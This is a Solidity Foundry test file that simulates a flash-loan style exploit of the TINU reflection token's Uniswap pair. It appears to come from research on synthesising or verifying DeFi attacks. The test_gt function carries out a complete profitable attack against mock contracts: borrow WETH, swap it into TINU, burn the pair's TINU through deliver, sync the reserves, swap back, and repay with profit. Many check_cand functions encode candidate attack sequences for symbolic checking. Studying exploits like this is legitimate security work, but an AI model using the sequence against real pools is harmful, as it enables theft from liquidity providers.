// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./TINU.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WETH} from "@utils/WETH.sol";

contract TINUTest is Test, BlockLoader {
    TINU tinu;
    WETH weth;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address tinuAddr;
    address wethAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1674717035;
    uint112 reserve0pair = 1781945970074638149262;
    uint112 reserve1pair = 22144561461014981232;
    uint32 blockTimestampLastpair = 1628422328;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 1071082433016123456880944697974037666088;
    uint256 price1CumulativeLastpair =
        827537596111131615299936214637285315298957;
    uint256 totalSupplyweth = 3905606665373372547578701;
    uint256 balanceOfwethpair = 22144561461014981232;
    uint256 balanceOfwethattacker = 0;
    uint256 balanceOfweth = 1084248678901911501449;
    uint256 totalSupplytinu = 1733820000000000000000;
    uint256 balanceOftinupair = 1781945970074638149262;
    uint256 balanceOftinuattacker = 0;
    uint256 balanceOftinu = 0;

    function setUp() public {
        owner = address(this);
        tinu = new TINU(
            payable(0x9980A74fCBb1936Bc79Ddecbd4148f7511598521),
            payable(0xEBA4a1e0ff3baF18A9D2910874Ffaee11911Cc31)
        );
        tinuAddr = address(tinu);
        weth = new WETH();
        wethAddr = address(weth);
        pair = new UniswapV2Pair(
            address(tinu),
            address(weth),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        weth.transfer(address(pair), balanceOfwethpair);
        tinu.transfer(address(pair), balanceOftinupair);
        tinu.afterDeploy(address(router), address(pair));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Tinu Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(tinu),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(tinu),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(weth),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(weth),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(pair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(pair),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(attackContract),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(attackContract),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_weth(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_weth(uint256 amount) internal {
        weth.transfer(owner, amount);
    }

    function borrow_owner_tinu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        tinu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_tinu(uint256 amount) internal {
        tinu.transfer(owner, amount);
    }

    function borrow_pair_weth(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_weth(uint256 amount) internal {
        weth.transfer(address(pair), amount);
    }

    function borrow_pair_tinu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        tinu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_tinu(uint256 amount) internal {
        tinu.transfer(address(pair), amount);
    }

    function swap_pair_tinu_weth(uint256 amount) internal {
        tinu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(tinu);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_weth_tinu(uint256 amount) internal {
        weth.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(tinu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_tinu(uint256 amount) internal {
        tinu.deliver(address(pair), amount);
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_weth(22e18);
        printBalance("After step0 ");
        swap_pair_weth_tinu(weth.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_tinu(100e18);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_tinu_weth(tinu.balanceOf(attacker));
        printBalance("After step4 ");
        payback_owner_weth((22e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        payback_owner_weth(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_tinu(amt0);
        burn_pair_tinu(amt1);
        payback_owner_tinu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_tinu(amt0);
        burn_pair_tinu(amt1);
        payback_pair_tinu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_tinu(amt0);
        burn_pair_tinu(amt1);
        swap_pair_tinu_weth(amt2);
        payback_owner_tinu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_tinu(amt0);
        burn_pair_tinu(amt1);
        sync_pair();
        payback_owner_tinu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_tinu(amt0);
        burn_pair_tinu(amt1);
        swap_pair_tinu_weth(amt2);
        payback_pair_tinu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_tinu(amt0);
        burn_pair_tinu(amt1);
        sync_pair();
        payback_pair_tinu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        swap_pair_tinu_weth(amt3);
        payback_owner_weth(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_tinu(amt0);
        burn_pair_tinu(amt1);
        swap_pair_tinu_weth(amt2);
        swap_pair_tinu_weth(amt3);
        payback_owner_tinu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_tinu(amt0);
        burn_pair_tinu(amt1);
        sync_pair();
        swap_pair_tinu_weth(amt2);
        payback_owner_tinu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        swap_pair_tinu_weth(amt3);
        payback_pair_weth(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_tinu(amt0);
        burn_pair_tinu(amt1);
        swap_pair_tinu_weth(amt2);
        swap_pair_tinu_weth(amt3);
        payback_pair_tinu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_tinu(amt0);
        burn_pair_tinu(amt1);
        sync_pair();
        swap_pair_tinu_weth(amt2);
        payback_pair_tinu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        swap_pair_tinu_weth(amt3);
        swap_pair_tinu_weth(amt4);
        payback_owner_weth(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        payback_owner_weth(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}